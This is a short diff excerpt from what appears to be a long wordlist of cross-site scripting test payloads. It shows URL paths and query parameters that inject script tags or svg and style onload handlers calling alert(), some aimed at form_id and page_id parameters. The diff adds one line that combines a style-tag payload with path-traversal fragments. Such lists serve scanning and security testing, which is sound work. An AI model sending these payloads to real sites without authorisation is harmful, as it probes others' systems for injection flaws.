@@ -11057,3 +11057,4 @@ request?info=<svg onload=alert(
 /?tabbed-login-name=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
 /?page_id={{page_with_shortcode}}&form_id=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
 /?page_id={{page_with_shortcode}}&form_id=1&title=%3Cscript%3Ealert%282%29%3C%2Fscript%3E
+/<style%20onload=alert`document.domain`;>../..%2f
